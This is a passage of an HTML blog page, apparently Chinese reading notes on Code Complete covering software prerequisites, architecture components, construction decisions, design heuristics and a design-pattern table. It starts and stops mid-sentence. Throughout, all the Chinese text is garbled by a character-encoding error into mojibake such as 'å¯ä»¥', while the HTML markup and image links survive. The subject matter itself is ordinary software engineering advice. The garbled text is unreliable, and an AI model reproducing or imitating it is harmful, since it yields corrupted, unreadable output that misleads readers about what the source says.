å¯ä»¥æŠŠæˆ¿å±‹çš„ç»“æ„æ€§çš„æ”¯æ’‘è§„åˆ’æ¸…æ¥šï¼Œè€Œåœ¨æ—¥åå†å†³å®šæ˜¯ç”¨æœ¨åœ°æ¿è¿˜æ˜¯åœ°æ¯¯ï¼Œåœ°é¢æ¼†æˆä»€ä¹ˆé¢œè‰²ï¼Œå±‹é¡¶ä½¿ç”¨ä»€ä¹ˆææ–™ï¼Œç­‰ç­‰ã€‚</p><p><font color='red'><strong>é¡¹ç›®çš„æˆè´¥å¾ˆå¤§ç¨‹åº¦ä¸Šåœ¨æ„å»ºæ´»åŠ¨çš„å¼€å§‹ä¹‹å‰å°±å·²ç»æ³¨å®šäº†ã€‚</strong></font></p><h2 id="ç¬¬3ç« -ä¸‰æ€è€Œåè¡Œï¼šå‰æœŸå‡†å¤‡"><a href="#ç¬¬3ç« -ä¸‰æ€è€Œåè¡Œï¼šå‰æœŸå‡†å¤‡" class="headerlink" title="ç¬¬3ç«  ä¸‰æ€è€Œåè¡Œï¼šå‰æœŸå‡†å¤‡"></a>ç¬¬3ç«  ä¸‰æ€è€Œåè¡Œï¼šå‰æœŸå‡†å¤‡</h2><blockquote><p> æœ¬ç« å†…å®¹é’ˆå¯¹æ¶æ„å¸ˆã€‚</p></blockquote><p>é”™è¯¯è¶Šæ—©å¼•å…¥è½¯ä»¶å½“ä¸­ï¼Œé—®é¢˜å°±ä¼šè¶Šå¤æ‚ï¼Œä¿®æ­£è¿™ä¸ªé”™è¯¯çš„ä»£ä»·ä¹Ÿå°±è¶Šé«˜ï¼Œå› ä¸ºé”™è¯¯ä¼šç‰µæ¶‰åˆ°ç³»ç»Ÿçš„æ›´å¤šéƒ¨åˆ†ã€‚</p><p>ç¨‹åºå‘˜æ˜¯è½¯ä»¶é£Ÿç‰©é“¾çš„æœ€åä¸€ç¯ï¼Œæ¶æ„å¸ˆåƒæ‰éœ€æ±‚ï¼Œè®¾è®¡å¸ˆåƒæ‰æ¶æ„ï¼Œè€Œç¨‹åºå‘˜åˆ™æ¶ˆåŒ–è®¾è®¡ã€‚</p><p>åœ¨è½¯ä»¶å¼€å‘ä¸­ï¼Œå¦‚æœéœ€æ±‚è¢«æ±¡æŸ“äº†ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šæ±¡æŸ“æ¶æ„ï¼Œè€Œæ¶æ„åˆä¼šæ±¡æŸ“æ„å»ºã€‚è¿™æ ·å°±ä¼šå¯¼è‡´ç¨‹åºå‘˜è„¾æ°”æš´èºï¼Œè¥å…»å¤±è°ƒï¼›å¼€å‘å‡ºçš„è½¯ä»¶å…·æœ‰æ”¾å°„æ€§æ±¡æŸ“ï¼Œè€Œä¸”å‘¨èº«éƒ½æ˜¯ç¼ºé™·ã€‚</p><p>åœ¨ä¸€å¼€å§‹å°±æŠŠäº‹æƒ…åšå¥½æ˜¯æœ€åˆç®—çš„ã€‚è¿›è¡Œéå¿…è¦çš„æ”¹åŠ¨çš„ä»£ä»·æ˜¯é«˜æ˜‚çš„ã€‚<strong>åœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹çš„ä¸Šæ¸¸å¼•å…¥çš„ç¼ºé™·é€šå¸¸æ¯”é‚£äº›åœ¨ä¸‹æ¸¸å¼•å…¥çš„ç¼ºé™·å…·æœ‰æ›´å¹¿æ³›çš„å½±å“åŠ›ã€‚</strong>è¿™ä¹Ÿä½¿å¾—æ—©æœŸçš„ç¼ºé™·ä»£ä»·æ›´åŠ é«˜æ˜‚ã€‚</p><p>å¦‚æœä½ ä¸èƒ½å‘ä¸€ä¸ªå…­å²å°å­©è§£é‡ŠæŸä»¶äº‹ï¼Œé‚£ä¹ˆä½ è‡ªå·±å°±æ²¡æœ‰çœŸæ­£ç†è§£å®ƒã€‚â€”â€”çˆ±å› æ–¯å¦</p><p>æ¶æ„çš„å…¸å‹ç»„æˆéƒ¨åˆ†ï¼š</p><ul><li>ç¨‹åºç»„ç»‡</li><li>ä¸»è¦çš„ç±»</li><li>æ•°æ®è®¾è®¡</li><li>ä¸šåŠ¡è§„åˆ™</li><li>ç”¨æˆ·ç•Œé¢è®¾è®¡</li><li>èµ„æºç®¡ç†</li><li>å®‰å…¨æ€§</li><li>æ€§èƒ½</li><li>å¯ä¼¸ç¼©æ€§</li><li>äº’ç”¨æ€§</li><li>å›½é™…åŒ–/æœ¬åœ°åŒ–</li><li>è¾“å…¥/è¾“å‡º</li><li>é”™è¯¯å¤„ç†</li><li>å®¹é”™æ€§</li><li>æ¶æ„çš„å¯è¡Œæ€§</li><li>è¿‡åº¦å·¥ç¨‹</li><li>å…³äºâ€œä¹°â€è¿˜æ˜¯â€œé€ â€çš„å†³ç­–</li><li>å…³äºå¤ç”¨çš„å†³ç­–</li><li>å˜æ›´ç­–ç•¥</li><li>æ¶æ„çš„æ€»ä½“è´¨é‡<ul><li>æ¶æ„çš„ç›®æ ‡åº”è¯¥æ¸…æ¥šçš„è¡¨è¿°</li><li>ä¼˜ç§€çš„è½¯ä»¶æ¶æ„å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ä¸æœºå™¨å’Œç¼–ç¨‹è¯­è¨€æ— å…³çš„</li><li>æ¶æ„åº”è¯¥è¸©åœ¨å¯¹ç³»ç»Ÿâ€œæ¬ æè¿°â€å’Œâ€œè¿‡åº¦æè¿°â€ä¹‹é—´çš„åˆ†ç•Œçº¿ä¸Š</li><li>æ¶æ„åº”è¯¥æ˜ç¡®åœ°æŒ‡å‡ºæœ‰é£é™©çš„åŒºåŸŸ</li><li>æ¶æ„åº”è¯¥åŒ…å«å¤šä¸ªè§†è§’</li><li>æœ€åï¼Œä½ ä¸åº”è¯¥æ‹…å¿§æ¶æ„çš„ä»»ä½•éƒ¨åˆ†ã€‚<strong>æ¶æ„ä¸åº”è¯¥åŒ…å«ä»»ä½•ä»…ä»…ä¸ºäº†å–æ‚¦è€æ¿çš„ä¸œè¥¿</strong>ã€‚å®ƒä¸åº”è¯¥åŒ…å«ä»»ä½•å¯¹ä½ è€Œè¨€å¾ˆéš¾ç†è§£çš„ä¸œè¥¿ã€‚ä½ å°±æ˜¯é‚£ä¸ªå®ç°æ¶æ„çš„äººï¼Œå¦‚æœä½ è‡ªå·±éƒ½å¼„ä¸æ‡‚ï¼Œé‚£åˆæ€ä¹ˆå®ç°å‘¢ï¼Ÿ</li></ul></li></ul><p><em>åœ¨è½¯ä»¶ä¸­ï¼Œé“¾æ¡çš„å¼ºåº¦ä¸æ˜¯å–å†³äºæœ€è–„å¼±çš„ä¸€ç¯ï¼Œè€Œæ˜¯ç­‰äºæ‰€æœ‰è–„å¼±ç¯èŠ‚çš„ä¹˜ç§¯ã€‚</em></p><p><em>æ„å»ºæ´»åŠ¨çš„å‡†å¤‡å·¥ä½œçš„æ ¹æœ¬ç›®æ ‡åœ¨äºé™ä½é£é™©ã€‚è¦ç¡®è®¤ä½ çš„å‡†å¤‡æ´»åŠ¨æ˜¯åœ¨é™ä½é£é™©ï¼Œè€Œéå¢åŠ é£é™©ã€‚</em></p><p>å¦‚æœä½ æƒ³å¼€å‘é«˜è´¨é‡çš„è½¯ä»¶ï¼Œè½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­å¿…é¡»ç”±å§‹è‡³ç»ˆå…³æ³¨è´¨é‡ã€‚åœ¨é¡¹ç›®åˆæœŸå…³æ³¨è´¨é‡ï¼Œå¯¹äº§å“è´¨é‡çš„æ­£é¢å½±å“æ¯”åœ¨é¡¹ç›®æœ«æœŸå…³æ³¨è´¨é‡çš„å½±å“è¦å¤§ã€‚</p><blockquote><p>ä¼˜ç§€çš„æ¶æ„ä¸æ˜¯ç”¨æ›´å¤šçš„ä¸œè¥¿ï¼Œè€Œæ˜¯ç”¨æ›´å°‘ã€æ›´ç®€å•çš„ä¸œè¥¿æ¥æ”¯æ’‘ç³»ç»Ÿã€‚</p></blockquote><h2 id="ç¬¬4ç« -å…³é”®çš„â€œæ„å»ºâ€å†³ç­–"><a href="#ç¬¬4ç« -å…³é”®çš„â€œæ„å»ºâ€å†³ç­–" class="headerlink" title="ç¬¬4ç«  å…³é”®çš„â€œæ„å»ºâ€å†³ç­–"></a>ç¬¬4ç«  å…³é”®çš„â€œæ„å»ºâ€å†³ç­–</h2><blockquote><p>æœ¬ç« å†…å®¹é’ˆå¯¹ç¨‹åºå‘˜æˆ–æŠ€æœ¯å¸¦å¤´äººã€‚</p></blockquote><p>æœ¬ç« æ¦‚è¿°ï¼š</p><ul><li>é€‰æ‹©ç¼–ç¨‹è¯­è¨€</li><li>ç¼–ç¨‹çº¦å®š<ul><li>æˆåŠŸç¼–ç¨‹çš„å…³é”®å°±åœ¨äºé¿å…éšæ„çš„å˜åŒ–ï¼Œè¿™æ ·ä½ çš„å¤§è„‘å°±å¯ä»¥ä¸“æ³¨äºé‚£äº›çœŸæ­£éœ€è¦çš„å˜åŒ–ã€‚</li></ul></li><li>ä½ åœ¨æŠ€æœ¯æµªæ½®ä¸­çš„ä½ç½®<ul><li>æ–°å…´ç¼–ç¨‹è¯­è¨€ä¼šè®©ä½ èŠ±å¾ˆå¤šæ—¶é—´æ¥ææ˜ç™½å®ƒæ˜¯å¦‚ä½•è¿ä½œçš„ï¼Œä»¥åŠè§£å†³å¾ˆå¤šè¯­è¨€ç¼ºé™·ï¼›æˆç†Ÿçš„è¯­è¨€åˆ™å¯ä»¥ç”¨å¤§éƒ¨åˆ†æ—¶é—´ç¨³å®šæŒç»­åœ°ç¼–å†™æ–°åŠŸèƒ½ã€‚</li></ul></li><li>é€‰æ‹©ä¸»è¦çš„æ„å»ºå®è·µæ–¹æ³•</li></ul><p>ä¸»è¦çš„æ„å»ºå®è·µï¼š</p><ul><li>ç¼–ç <ul><li>ä½ æœ‰æ²¡æœ‰ç¡®å®šæœ‰å¤šå°‘è®¾è®¡å·¥ä½œéœ€è¦é¢„å…ˆè¿›è¡Œï¼Œå¤šå°‘å·¥ä½œé€šè¿‡ç¼–ç å®Œæˆï¼Ÿ</li><li>æœ‰æ²¡æœ‰è§„å®šè¯¸å¦‚åç§°ã€æ³¨é‡Šã€ä»£ç æ ¼å¼ç­‰â€œç¼–ç çº¦å®šâ€ï¼Ÿ</li><li>æœ‰æ²¡æœ‰è§„å®šç‰¹å®šçš„ç”±è½¯ä»¶æ¶æ„ç¡®å®šçš„ç¼–ç å®è·µï¼Ÿå¦‚æ€æ ·å¤„ç†é”™è¯¯æ¡ä»¶ã€å¦‚ä½•å¤„ç†å®‰å…¨æ€§äº‹é¡¹ã€å¯¹äºç±»æ¥å£æœ‰å“ªäº›çº¦å®šã€å¯é‡ç”¨çš„ä»£ç éµå¾ªå“ªäº›æ ‡å‡†ã€åœ¨ç¼–ç æ—¶è€ƒè™‘å¤šå°‘æ€§èƒ½å› ç´ ç­‰ï¼Ÿ</li><li>æœ‰æ²¡æœ‰æ‰¾åˆ°è‡ªå·±åœ¨æŠ€æœ¯æµªæ½®ä¸­çš„ä½ç½®ï¼Œå¹¶ç›¸åº”è°ƒæ•´è‡ªå·±çš„æªæ–½ï¼Ÿå¦‚æœå¿…è¦ï¼Œä½ æ˜¯å¦çŸ¥é“å¦‚ä½•â€œæ·±å…¥ä¸€ç§è¯­è¨€å»ç¼–ç¨‹â€ï¼Œè€Œä¸å—é™äºè¯­è¨€ï¼Ÿ</li></ul></li><li>å›¢é˜Ÿå·¥ä½œ<ul><li>æœ‰æ²¡æœ‰å®šä¹‰ä¸€å¥—é›†æˆå·¥å…·ï¼Ÿå³ï¼Œä½ æœ‰æ²¡æœ‰å®šä¹‰ä¸€å¥—å·¥ä½œæµï¼Œè§„å®šç¨‹åºå‘˜åœ¨æŠŠä»£ç  check in åˆ° master ä¹‹å‰ï¼Œå¿…é¡»å®Œæˆè¿™äº›æ­¥éª¤ï¼Ÿ</li><li>ç¨‹åºå‘˜æ˜¯ç»“å¯¹ç¼–ç¨‹è¿˜æ˜¯ç‹¬è‡ªç¼–ç¨‹ï¼Ÿæˆ–è€…æ˜¯è¿™äºŒè€…çš„æŸç§ç»„åˆï¼Ÿ</li></ul></li><li>è´¨é‡ä¿è¯<ul><li>ç¨‹åºå‘˜åœ¨ç¼–å†™ä»£ç ä¹‹å‰ï¼Œæ˜¯å¦å…ˆä¸ºä¹‹ç¼–å†™æµ‹è¯•ç”¨ä¾‹ï¼Ÿ</li><li>ç¨‹åºå‘˜ä¼šä¸ºè‡ªå·±çš„ä»£ç å†™å•å…ƒæµ‹è¯•å—ï¼Ÿ</li><li>ç¨‹åºå‘˜åœ¨ check in ä»£ç å‰ï¼Œä¼šç”¨è°ƒè¯•å™¨å•æ­¥è·Ÿè¸ªæ•´ä¸ªä»£ç æµç¨‹å—ï¼Ÿ</li><li>ç¨‹åºå‘˜åœ¨ check in ä»£ç å‰ï¼Œæ˜¯å¦è¿›è¡Œé›†æˆæµ‹è¯•ï¼Ÿ</li><li>ç¨‹åºå‘˜ä¼š review æˆ–æ£€æŸ¥åˆ«äººçš„ä»£ç å—ï¼Ÿ</li></ul></li><li>å·¥å…·<ul><li>ä½ æ˜¯å¦é€‰ç”¨äº†æŸç§ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Ÿ</li><li>ä½ æ˜¯å¦é€‰å®šäº†ä¸€ç§è¯­è¨€ï¼Œä»¥åŠè¯­è¨€çš„ç‰ˆæœ¬æˆ–ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼Ÿ</li><li>ä½ æ˜¯å¦é€‰å®šäº†æŸä¸ªç¼–ç¨‹æ¡†æ¶ï¼Œæˆ–è€…æ˜ç¡®åœ°å†³å®šä¸ä½¿ç”¨ç¼–ç¨‹æ¡†æ¶ï¼Ÿ</li><li>ä½ æ˜¯å¦å†³å®šå…è®¸ä½¿ç”¨éæ ‡å‡†çš„è¯­è¨€ç‰¹æ€§ï¼Ÿ</li><li>ä½ æ˜¯å¦é€‰å®šå¹¶æ‹¥æœ‰äº†å…¶ä»–å°†ç”¨åˆ°çš„å·¥å…·â€”â€”ç¼–è¾‘å™¨ã€é‡æ„å·¥å…·ã€è°ƒè¯•å™¨ã€æµ‹è¯•æ¡†æ¶ã€è¯­æ³•æ£€æŸ¥ç­‰ã€‚</li></ul></li></ul><p>ä¸åŒçš„ç¼–ç¨‹è¯­è¨€åªæ˜¯ä¸åŒçš„è¡¨è¾¾æ–¹å¼ã€‚</p><h2 id="ç¬¬5ç« -è½¯ä»¶æ„æ¶ä¸­çš„è®¾è®¡"><a href="#ç¬¬5ç« -è½¯ä»¶æ„æ¶ä¸­çš„è®¾è®¡" class="headerlink" title="ç¬¬5ç«  è½¯ä»¶æ„æ¶ä¸­çš„è®¾è®¡"></a>ç¬¬5ç«  è½¯ä»¶æ„æ¶ä¸­çš„è®¾è®¡</h2><p><strong>è½¯ä»¶çš„é¦–è¦æŠ€æœ¯ä½¿å‘½ï¼šç®¡ç†å¤æ‚åº¦ã€‚</strong></p><h3 id="ç†æƒ³çš„è®¾è®¡ç‰¹å¾"><a href="#ç†æƒ³çš„è®¾è®¡ç‰¹å¾" class="headerlink" title="ç†æƒ³çš„è®¾è®¡ç‰¹å¾"></a>ç†æƒ³çš„è®¾è®¡ç‰¹å¾</h3><ul><li>æœ€å°çš„å¤æ‚åº¦</li><li>æ˜“äºç»´æŠ¤</li><li>æ¾æ•£è€¦åˆ</li><li>å¯æ‰©å±•æ€§ï¼ˆå¢å¼ºç³»ç»Ÿçš„åŠŸèƒ½è€Œæ— éœ€ç ´åå…¶ä»–åº•å±‚ç»“æ„ï¼‰</li><li>å¯é‡ç”¨æ€§</li><li>é«˜æ‰‡å…¥ï¼ˆå¤§é‡çš„ç±»ä½¿ç”¨è¯¥ç±»ï¼‰</li><li>ä½æ‰‡å‡ºï¼ˆä¸€ä¸ªç±»ä¸­å°‘é‡ä½¿ç”¨å…¶ä»–ç±»ï¼‰</li><li>å¯ç§»æ¤æ€§</li><li>ç²¾ç®€æ€§</li><li>å±‚æ¬¡æ€§</li><li>æ ‡å‡†æŠ€æœ¯</li></ul><p>ä¸¾ä¾‹æ¥è¯´ï¼Œåœ¨å›¾ 5-3 ä¸­ï¼Œä½ æŠŠä¸€ä¸ªç³»ç»Ÿåˆ’åˆ†æˆ 6 ä¸ªå­ç³»ç»Ÿã€‚åœ¨æ²¡æœ‰å®šä¹‰ä»»ä½•è§„åˆ™æ—¶ï¼Œçƒ­åŠ›å­¦ç¬¬äºŒå®šå¾‹å°±ä¼šå‘ç”Ÿä½œç”¨ï¼Œæ•´ä¸ªç³»ç»Ÿçš„ç†µå°†ä¼šå¢åŠ ã€‚ç†µä¹‹æ‰€ä»¥å¢åŠ çš„ä¸€ç§åŸå› æ˜¯ï¼Œå¦‚æœä¸å¯¹å­ç³»ç»Ÿé—´çš„é€šä¿¡åŠ ä»¥ä»»ä½•é™åˆ¶ï¼Œé‚£ä¹ˆå®ƒä»¬ä¹‹é—´çš„é€šä¿¡å°±ä¼šè‚†æ„åœ°å‘ç”Ÿï¼Œå¦‚å›¾ 5-4 æ‰€ç¤ºã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7fahb13zij30ee0gcq72.jpg" alt=""></p><p>ä½ å¯ä»¥æŠŠå­ç³»ç»Ÿé—´çš„è¿æ¥å½“åšæ°´ç®¡ã€‚å½“ä½ æƒ³å»æ‰æŸä¸ªå­ç³»ç»Ÿæ—¶ï¼ŒåŠ¿å¿…ä¼šæœ‰ä¸å°‘æ°´ç®¡è¿åœ¨ä¸Šé¢ã€‚ä½ éœ€è¦æ–­å¼€å†é‡æ–°è¿æ¥çš„æ°´ç®¡æ•°é‡è¶Šå¤šï¼Œå¼„å‡ºæ¥çš„æ°´å°±ä¼šè¶Šå¤šã€‚ä½ è‚¯å®šæƒ³æŠŠç³»ç»Ÿçš„æ¶æ„è®¾è®¡æˆè¿™æ ·ï¼šå¦‚æœæƒ³æŠŠæŸä¸ªå­ç³»ç»Ÿå–èµ°é‡ç”¨æ—¶ï¼Œä¸ç”¨é‡æ–°è¿æ¥å¤ªå¤šæ°´ç®¡ï¼Œé‡æ–°è¿æ¥èµ·æ¥ä¹Ÿä¸ä¼šå¤ªéš¾ã€‚</p><p>æœ‰å…ˆè§ä¹‹æ˜çš„è¯ï¼Œæ‰€æœ‰è¿™äº›é—®é¢˜å°±ä¸ä¼šèŠ±å¤ªå¤šé¢å¤–çš„åŠŸå¤«ã€‚åªæœ‰å½“â€œç¡®éœ€äº†è§£â€â€”â€”æœ€å¥½è¿˜æœ‰åˆç†çš„ç†ç”±â€”â€”æ—¶ï¼Œæ‰åº”è¯¥å…è®¸å­ç³»ç»Ÿé—´çš„é€šä¿¡ã€‚å¦‚æœä½ è¿˜æ‹¿ä¸å‡†è¯¥å¦‚ä½•è®¾è®¡çš„è¯ï¼Œé‚£ä¹ˆå°±åº”è¯¥å…ˆå¯¹å­ç³»ç»Ÿä¹‹é—´çš„é€šä¿¡åŠ ä»¥é™åˆ¶ï¼Œç­‰æ—¥åéœ€è¦æ—¶å†æ”¾å¼€ï¼Œè¿™è¦æ¯”å…ˆä¸é™åˆ¶ï¼Œç­‰å­ç³»ç»Ÿé—´å·²ç»æœ‰äº†ä¸Šç™¾ä¸ªè°ƒç”¨æ—¶å†åŠ ä»¥é™åˆ¶è¦å®¹æ˜“å¾—å¤šã€‚å›¾ 5-5 å±•ç¤ºäº†æ–½åŠ å°‘é‡é€šä¿¡è§„åˆ™åå¯ä»¥æŠŠå›¾ 5-4 ä¸­çš„ç³»ç»Ÿå˜æˆçš„æ ·å­ï¼š<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7faopuc5gj30g6080gne.jpg" alt=""></p><h3 id="ä½¿ç”¨å¯¹è±¡è¿›è¡Œè®¾è®¡çš„æ­¥éª¤"><a href="#ä½¿ç”¨å¯¹è±¡è¿›è¡Œè®¾è®¡çš„æ­¥éª¤" class="headerlink" title="ä½¿ç”¨å¯¹è±¡è¿›è¡Œè®¾è®¡çš„æ­¥éª¤"></a>ä½¿ç”¨å¯¹è±¡è¿›è¡Œè®¾è®¡çš„æ­¥éª¤</h3><ol><li>è¾¨è¯†å¯¹è±¡åŠå…¶å±æ€§ï¼ˆæ–¹æ³•å’Œæ•°æ®ï¼‰</li><li>ç¡®å®šå¯ä»¥å¯¹å„ä¸ªå¯¹è±¡è¿›è¡Œçš„æ“ä½œ</li><li>ç¡®å®šå„ä¸ªå¯¹è±¡èƒ½å¯¹å…¶ä»–å¯¹è±¡è¿›è¡Œçš„æ“ä½œ</li><li>ç¡®å®šå¯¹è±¡çš„å“ªäº›éƒ¨åˆ†å¯¹å…¶ä»–å¯¹è±¡å¯è§â€”â€”å“ªäº›éƒ¨åˆ†å¯ä»¥æ˜¯å…¬ç”¨ï¼ˆ<code>public</code>ï¼‰çš„ï¼Œå“ªäº›éƒ¨åˆ†åº”è¯¥æ˜¯ç§ç”¨ï¼ˆ<code>private</code>ï¼‰çš„</li><li>å®šä¹‰æ¯ä¸ªå¯¹è±¡çš„å…¬å¼€æ¥å£ï¼ˆ<code>public interface</code>ï¼‰</li></ol><h3 id="ç±»çš„å†°å±±å®šå¾‹"><a href="#ç±»çš„å†°å±±å®šå¾‹" class="headerlink" title="ç±»çš„å†°å±±å®šå¾‹"></a>ç±»çš„å†°å±±å®šå¾‹</h3><p>åœ¨è®¾è®¡ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œä¸€é¡¹å…³é”®æ€§çš„å†³ç­–å°±æ˜¯ç¡®å®šç±»çš„å“ªäº›ç‰¹æ€§åº”è¯¥å¯¹å¤–å¯è§ï¼Œè€Œé‚£äº›ç‰¹æ€§åº”è¯¥éšè—èµ·æ¥ã€‚ä¸€ä¸ªç±»å¯èƒ½æœ‰ 25 ä¸ªå­ç¨‹åºï¼Œä½†åªæš´éœ²äº†å…¶ä¸­çš„ 5 ä¸ªï¼Œå…¶ä½™ 20 ä¸ªä»…é™äºåœ¨ç±»çš„å†…éƒ¨ä½¿ç”¨ã€‚ä¸€ä¸ªç±»åœ¨å†…éƒ¨å¯èƒ½ç”¨åˆ°äº†å¤šç§æ•°æ®ç±»å‹ï¼Œå´ä¸å¯¹å¤–æš´éœ²æœ‰å…³ä»–ä»¬çš„ä»»ä½•ä¿¡æ¯ã€‚åœ¨ç±»çš„è®¾è®¡ä¸­ï¼Œè¿™ä¸€æ–¹é¢ä¹Ÿç§°ä¸ºâ€œå¯è§æ€§ï¼ˆvisibilityï¼‰â€ï¼Œå› ä¸ºå®ƒè¦ç¡®å®šçš„å°±æ˜¯ç±»çš„å“ªäº›ç‰¹æ€§å¯¹å¤–ç•Œæ˜¯â€œå¯è§çš„â€æˆ–èƒ½â€œæš´éœ²â€ç»™å¤–ç•Œã€‚</p><p>ç±»çš„æ¥å£åº”è¯¥å°½å¯èƒ½å°‘åœ°æš´éœ²å…¶å†…éƒ¨å·¥ä½œæœºåˆ¶ã€‚ç±»å¾ˆåƒå†°å±±ï¼šå…«åˆ†ä¹‹ä¸ƒéƒ½æ˜¯ä½äºæ°´é¢ä¹‹ä¸‹ï¼Œè€Œä½ åªèƒ½çœ‹åˆ°æ°´é¢ä¸Šçš„å…«åˆ†ä¹‹ä¸€ã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7fastbxnmj308w066t8w.jpg" alt=""></p><h3 id="å¦‚ä½•åº”å¯¹å˜åŒ–"><a href="#å¦‚ä½•åº”å¯¹å˜åŒ–" class="headerlink" title="å¦‚ä½•åº”å¯¹å˜åŒ–"></a>å¦‚ä½•åº”å¯¹å˜åŒ–</h3><p>ä¸€ä¸ªä¼˜ç§€çš„è®¾è®¡å¸ˆåº”è¯¥æœ‰å¯¹å˜åŒ–çš„é¢„æœŸèƒ½åŠ›ï¼Œå¥½çš„ç¨‹åºè®¾è®¡æ‰€é¢ä¸´çš„æœ€é‡è¦æŒ‘æˆ˜ä¹‹ä¸€å°±æ˜¯é€‚åº”å˜åŒ–ã€‚ç›®æ ‡åº”è¯¥æ˜¯æŠŠä¸ç¨³å®šçš„åŒºåŸŸéš”ç¦»å‡ºæ¥ï¼Œä»è€ŒæŠŠå˜åŒ–æ‰€å¸¦æ¥çš„å½±å“é™åˆ¶åœ¨ä¸€ä¸ªå­ç¨‹åºã€ç±»æˆ–è€…åŒ…çš„å†…éƒ¨ã€‚å¯é‡‡å–ä»¥ä¸‹å‡ ç‚¹æªæ–½ï¼š</p><ul><li>æ‰¾å‡ºçœ‹èµ·æ¥å®¹æ˜“å˜åŒ–çš„é¡¹ç›®</li><li>æŠŠå®¹æ˜“å˜åŒ–çš„é¡¹ç›®åˆ†ç¦»å‡ºæ¥</li><li>æŠŠçœ‹èµ·æ¥å®¹æ˜“å˜åŒ–çš„é¡¹ç›®éš”ç¦»å¼€æ¥</li></ul><h4 id="åˆç†ä½¿ç”¨è®¾è®¡æ¨¡å¼"><a href="#åˆç†ä½¿ç”¨è®¾è®¡æ¨¡å¼" class="headerlink" title="åˆç†ä½¿ç”¨è®¾è®¡æ¨¡å¼"></a>åˆç†ä½¿ç”¨è®¾è®¡æ¨¡å¼</h4><table><thead><tr><th>æ¨¡å¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>æŠ½è±¡å·¥å‚</td><td>é€šè¿‡åˆ¶å®šå¯¹è±¡ç»„çš„ç§ç±»è€Œéå•ä¸ªå¯¹è±¡çš„ç±»å‹æ¥æ”¯æŒåˆ›å»ºä¸€ç»„ç›¸å…³çš„å¯¹è±¡</td></tr><tr><td>é€‚é…å™¨</td><td>æŠŠä¸€ä¸ªç±»çš„æ¥å£è½¬å˜æˆå¦ä¸€ä¸ªæ¥å£</td></tr><tr><td>æ¡¥æ¥</td><td>æŠŠæ¥å£å’Œç°å®åˆ†ç¦»å¼€æ¥ï¼Œä½¿ä»–ä»¬å¯ä»¥ç‹¬ç«‹çš„å˜åŒ–</td></tr><tr><td>ç»„åˆ</td><td>åˆ›å»ºä¸€ä¸ªåŒ…å«å…¶ä»–åŒç±»å¯¹è±¡çš„å¯¹è±¡ï¼Œä½¿å¾—å®¢æˆ·ä»£ç å¯ä»¥ä¸æœ€ä¸Šå±‚å¯¹è±¡äº¤äº’è€Œæ— é¡»è€ƒè™‘æ‰€æœ‰çš„ç»†èŠ‚å¯¹è±¡</td></tr><tr><td>è£…é¥°å™¨</td><td>ç»™ä¸€ä¸ªå¯¹è±¡åŠ¨æ€åœ°æ·»åŠ èŒè´£ï¼Œè€Œæ— é¡»ä¸ºäº†æ¯ä¸€ç§å¯èƒ½çš„èŒè´£é…ç½®æƒ…å†µå»åˆ›å»ºç‰¹å®šçš„å­ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰</td></tr><tr><td>å¤–è§‚</td><td>ä¸ºæ²¡æœ‰æä¾›ä¸€è‡´æ¥å£çš„ä»£ç æä¾›ä¸€ä¸ªä¸€è‡´çš„æ¥å£</td></tr><tr><td>å·¥å‚æ–¹æ³•</td><td>åšç‰¹å®šåŸºç±»çš„æ´¾ç”Ÿç±»çš„å®ä¾‹åŒ–æ—¶ï¼Œé™¤äº†åœ¨å·¥å‚æ–¹æ³•å†…éƒ¨ä¹‹å¤–å‡æ— é¡»äº†è§£å„æ´¾ç”Ÿå¯¹è±¡çš„å…·ä½“ç±»å‹</td></tr><tr><td>è¿­ä»£å™¨</td><td>æä¾›ä¸€ä¸ªæœåŠ¡å¯¹è±¡æ¥é¡ºåºåœ°è®¿é—®ä¸€ç»„å…ƒç´ ä¸­çš„å„ä¸ªå…ƒç´ </td></tr><tr><td>è§‚å¯Ÿè€…</td><td>ä½¿ä¸€ç»„ç›¸å…³å¯¹è±¡ç›¸äº’åŒæ­¥ï¼Œæ–¹æ³•æ˜¯è®©å¦ä¸€ä¸ªå¯¹è±¡è´Ÿè´£ï¼šåœ¨è¿™ç»„å¯¹è±¡ä¸­çš„ä»»ä½•ä¸€ä¸ªå‘ç”Ÿæ”¹å˜æ—¶ï¼Œç”±å®ƒæŠŠè¿™ç§å˜åŒ–é€šçŸ¥ç»™è¿™ä¸ªç»„é‡Œçš„æ‰€æœ‰å¯¹è±¡</td></tr><tr><td>å•ä¾‹</td><td>ä¸ºæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå®ä¾‹çš„ç±»æä¾›ä¸€ç§å…¨å±€è®¿é—®åŠŸèƒ½</td></tr><tr><td>ç­–ç•¥</td><td>å®šä¹‰ä¸€ç»„ç®—æ³•æˆ–è€…è¡Œä¸ºï¼Œä½¿å¾—ä»–ä»¬å¯ä»¥åŠ¨æ€åœ°ç›¸äº’æ›¿æ¢</td></tr><tr><td>æ¨¡æ¿æ–¹æ³•</td><td>å®šä¹‰ä¸€ä¸ªæ“ä½œçš„ç®—æ³•ç»“æ„ï¼Œä½†æ˜¯æŠŠéƒ¨åˆ†å®ç°çš„ç»†èŠ‚ç•™ç»™å­ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰</td></tr></tbody></table><h4 id="åˆä½œçš„æ–¹å¼"><a href="#åˆä½œçš„æ–¹å¼" class="headerlink" title="åˆä½œçš„æ–¹å¼"></a>åˆä½œçš„æ–¹å¼</h4><p>åœ¨è®¾è®¡è¿‡ç¨‹ä¸­ï¼Œä¸‰ä¸ªè‡­çš®åŒ èµ›è¿‡è¯¸è‘›äº®ï¼Œè€Œä¸è®ºç»„ç»‡å½¢å¼çš„æ­£å¼ä¸å¦ã€‚åˆä½œå¯ä»¥ä»¥ä¸‹é¢ä»»æ„ä¸€ç§æ–¹å¼å±•å¼€ã€‚</p><ul><li>ä½ 